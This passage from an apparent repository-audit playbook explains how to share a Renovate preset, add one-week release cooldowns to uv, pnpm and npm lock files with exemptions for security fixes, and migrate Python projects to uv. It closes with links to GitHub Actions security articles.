| Action references | as written | pinned to digests (`helpers:pinGitHubActionDigests`) |

The pull request's Renovate section reports the rows that change for the repository, starting from its effective value: the "before" column, or the repository's own setting where it has one (flare: `before 4am on Monday` in UTC, label `dependencies`). A repository with no Renovate config had no Renovate running, even when the App covers it: the section lists the preset's settings as what starts. Dependabot security updates overlap with Renovate's vulnerability pull requests (both act on Dependabot alerts); §11 says when to turn them off.

In the repository's config:

- **Remove** what the preset already sets: `config:recommended` and `helpers:pinGitHubActionDigests` in `extends`, `schedule`, `timezone`, `labels`, `minimumReleaseAge`, `prHourlyLimit`, `lockFileMaintenance`, the rule disabling `python`, and the rules grouping by manager. The audit prints each setting the config shares with the preset (a repository rule beside the preset rule it duplicates), then the rest as "Kept (own rules)".
- **Keep** the repository's own rules: `:pinOnlyDevDependencies`, `rangeStrategy: widen` for a library, `allowedVersions` blocks, groups that feed a lock refresh workflow. The pull request lists each kept key that overrides the preset (its own schedule, `minimumReleaseAge: "0 days"` for an internal action), with its reason.

Renovate reports config errors in its Dependency Dashboard issue. To check a config before pushing (optional, up to 30 s): `npx --yes --package renovate@latest -- renovate-config-validator renovate.json 2>&1 | grep -v 'npm warn'`. It passes on `Config validated successfully`; the `Validating renovate.json as global config` line and a `WARN: RE2 not usable` followed by a multi-line `Cannot find module 're2'` stack are expected.

---

## 15. Dependency lock and cooldown

A **Dependency cooldown** keeps a release out of the lock until it is 7 days old. The window is the shared preset's `minimumReleaseAge` (§14), its single source: change both together. Renovate's lock file maintenance has no release date to wait for, so the package manager enforces the window. Apply it to each project directory of the audit's "Dependencies" section (a monorepo has several), in the commit `build: lock dependencies with a one-week cooldown`:

| Manager | Lock, committed and out of `.gitignore` | Cooldown | CI install |
|---|---|---|---|
| uv | `uv.lock` | `exclude-newer = "1 week"` under `[tool.uv]` in `pyproject.toml`, uv >= 0.9.17 | `uv sync --locked` |
| pnpm | `pnpm-lock.yaml` | `minimumReleaseAge: 10080` (minutes) in `pnpm-workspace.yaml`, pnpm >= 10.16 | `pnpm install --frozen-lockfile` |
| npm | `package-lock.json` | `min-release-age=7` (days) in `.npmrc`, npm >= 11.10.0 | `npm ci` |

- **Versions**: compare the minimum with the version CI pins (setup-uv `version:`, `packageManager`, `engines`), and run the lock check with that version: `uvx uv@<pinned> lock --check`.
- **CI install** is the command the workflow step runs. When the step calls a Makefile or script target shared with developers (`make setup` running `uv sync`), the step runs the locked command instead and the target stays as is; the pull request says so.
- **uv** stores the window in the lock (`exclude-newer-span = "P1W"`), so `--locked` stays valid as time passes; the cutoff moves only on a new resolution (`uv lock --upgrade`, lock file maintenance). A repository that already commits `uv.lock` gets the cooldown and `--locked` too.
- **pnpm** 10 also reads `minimum-release-age=10080` from `.npmrc`; pnpm 11 reads only auth, registry and proxy settings there, and its default window is 1440 minutes. A `.npmrc` setting moves to `pnpm-workspace.yaml`.
- **npm**: Renovate passes `--before` to `npm install` unless `.npmrc` sets `min-release-age`, so the `.npmrc` setting is the one that applies.
- **A lock out of date** (the audit runs `uv lock --check`): the cooldown relock also brings it up to date, and rewrites the whole file. Show what moved: `git show origin/<default>:<dir>/uv.lock > /tmp/old.lock`, then `python3 <skill>/scripts/compare_locks.py /tmp/old.lock <dir>/uv.lock`. "Same package set and versions" means only the format changed; otherwise the pull request lists the packages it prints.
- **A relock that forces upgrades** (a git source commit that no longer exists, a yanked version): that directory leaves the dependency commit for its own, `build: relock <dir> (needs a decision)`, cooldown included. `uv lock --upgrade-package <package>` moves only the package that cannot stay; the commit message and the pull request list every package `compare_locks.py` shows moved.
- **Installs outside the lock** (the audit lists them per workflow): a CI step that installs a package itself (`uv pip install git+...@<branch>`, `pip install <pkg>`) escapes the lock and the cooldown. Report it in the Dependencies section, and recommend declaring it in `pyproject.toml` with a source under `[tool.uv.sources]` (git with `rev` or `tag`), so `uv.lock` pins it.

**Security fixes.** Renovate opens vulnerability pull requests without waiting, but the package manager still applies its cooldown, so a fix uploaded less than 7 days ago cannot be locked ([renovatebot/renovate#45113](https://github.com/renovatebot/renovate/discussions/45113)). In that pull request, exempt the fix, and remove the exemption at the next lock file maintenance. The audit lists the open vulnerability pull requests and flags each version `YOUNGER THAN 7 DAYS`: the Dependencies section names each flagged one with the exemption it needs once the cooldown merges.

- uv: `exclude-newer-package = { <package> = "<a timestamp just after the fix's upload>" }` under `[tool.uv]`.
- pnpm: `minimumReleaseAgeExclude: [<package>@<version>]` in `pnpm-workspace.yaml` (a version needs pnpm >= 10.19). Renovate writes it for a pnpm security update when `pnpm-workspace.yaml` sets `minimumReleaseAge`; check it is there.
- npm: `min-release-age-exclude[]=<package>` in `.npmrc`, npm >= 12. It exempts every version of the package. npm 11 has no exemption: the fix waits, or the pull request lowers `min-release-age` until the next lock file maintenance.

### Convert a Python project to uv

Each Python project the audit marks `convert to uv` (Poetry, Rye, PDM, Pipenv, pip-tools, requirements files) moves to uv in the commit `build: move <dirs> to uv`, cooldown included, after the dependency commit.

1. **Go/no-go.** Search the repository for every reader of the old manager's files outside the local environment: Dockerfiles (`COPY requirements*.txt`, `pip install -r`, `poetry install`), Modal or other image definitions (`pip_install_from_requirements`, `from_dockerfile`), Makefiles, Procfiles, CI, deploy scripts, docs. Convert when each reader can switch to uv (`uv sync --locked`, or `uv export --frozen --no-hashes -o requirements.txt` for one that needs a requirements file) or none exists. Otherwise the project keeps its manager, and the Dependencies section says which reader kept it.
2. **Migrate.**
   - Poetry, Pipenv, pip-tools, pip: `uvx migrate-to-uv@0.12.0 --keep-current-build-backend --dependency-groups-strategy set-default-groups <dir>` (0.12.0 is the latest release on 2026-11-09: check PyPI for a newer one). It locks with the old versions; without an old lock, add `--skip-lock`. Then add the cooldown and run `uv lock`. A kept `poetry-core` backend needs `requires = ["poetry-core>=2.0,<3"]` to read `[project]`.
   - Rye, PDM (migrate-to-uv supports neither), by hand: `[tool.rye]` or `[tool.pdm]` becomes `[tool.uv]` with the cooldown, dev dependencies move to `[dependency-groups] dev`; lock once with the old lock's pins as temporary `constraint-dependencies` under `[tool.uv]`, remove them, lock again.

   Delete the old lock and requirements files once nothing reads them.
3. **Keep the versions.** `compare_locks.py <old lock> <dir>/uv.lock` shows the same versions; a platform-only addition (`colorama` on Windows) is expected, since `uv.lock` covers every platform. When a newer interpreter cannot install the old versions (no wheels, a failed source build), pin `.python-version` to the Python the old lock was made for, the `requires-python` floor. A project with no old lock gets a first resolution: the pull request lists its top-level versions.
4. **Docs and scripts** of the converted project: `poetry install`, `rye sync` and the like become `uv sync`, `poetry run` becomes `uv run`, and a bare `python` that assumed an activated environment becomes `uv run python`. A doc elsewhere that is already wrong for other reasons is reported, not rewritten.
5. **Verify**: `uv lock --check`, `uv sync --locked` in a fresh environment, and the command or import the README shows, run locally and offline (never one that calls a model or deploys). When a deploy cannot run here (credentials, GPUs), check what you can (the client version unchanged, the package still importable) and the pull request names the command not run: the next deploy is the real check.

**Any other manager** (Yarn, Bun, Go, Cargo, a Python project the go/no-go keeps) is not converted. The pull request's Dependencies section says which manager the repository uses instead of uv, pnpm or npm, whether it has a lock and a cooldown, and its native setting:

| Manager | Native cooldown | Exemption |
|---|---|---|
| Poetry | `poetry config --local solver.min-release-age 7` (days, writes `poetry.toml`), Poetry >= 2.4 | `solver.min-release-age-exclude` |
| Rye | none | |
| Yarn | `npmMinimalAgeGate: 7d` in `.yarnrc.yml`, Yarn >= 4.10 | `npmPreapprovedPackages` |
| Bun | `minimumReleaseAge = 604800` (seconds) under `[install]` in `bunfig.toml` | `minimumReleaseAgeExcludes` |
| pip | `--uploaded-prior-to P7D`, pip >= 26.1 (26.0 takes a date only) | none |
| Go, Cargo | none | |

Consumers of a library are unaffected: a package manager never reads a dependency's lock.

---

## Sources

- [Part 1: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [Part 3: How to trust your building blocks](https://securitylab.github.com/research/github-actions-building-blocks/)
- [Part 4: New patterns and mitigations](https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/)
